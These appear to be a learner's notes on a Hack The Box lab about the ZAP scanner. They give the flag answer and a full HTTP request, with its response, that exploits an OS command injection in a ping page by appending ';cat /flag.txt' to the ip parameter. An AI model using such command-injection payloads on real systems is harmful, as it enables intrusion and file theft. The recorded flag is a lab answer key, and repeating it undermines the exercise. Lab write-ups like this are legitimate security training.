# ZAP Scanner
## Questions
1. Run ZAP Scanner on the target above to identify directories and potential vulnerabilities. Once you find the high-level vulnerability, try to use it to read the flag at '/flag.txt' **Answer:  HTB{5c4nn3r5_f1nd_vuln5_w3_m155}**
   - Still the same OS command injection found without the stupid ZAP scanner:
        ```
        GET /devtools/ping.php?ip=127.0.0.1;cat+/flag.txt; HTTP/1.1
        Host: 154.57.164.77:30724
        Accept-Language: en-US,en;q=0.9
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive
        ```
        ```
        HTTP/1.1 200 OK
        Date: Thu, 07 May 2026 10:56:59 GMT
        Server: Apache/2.4.41 (Ubuntu)
        Vary: Accept-Encoding
        Content-Length: 156
        Keep-Alive: timeout=5, max=100
        Connection: Keep-Alive
        Content-Type: text/html; charset=UTF-8

        <!DOCTYPE html>

        <html lang="en">

        <head>
        <meta charset="UTF-8">
        <title>Ping</title>
        </head>

        <body>
        HTB{5c4nn3r5_f1nd_vuln5_w3_m155}
        </body>

        </html>
        ```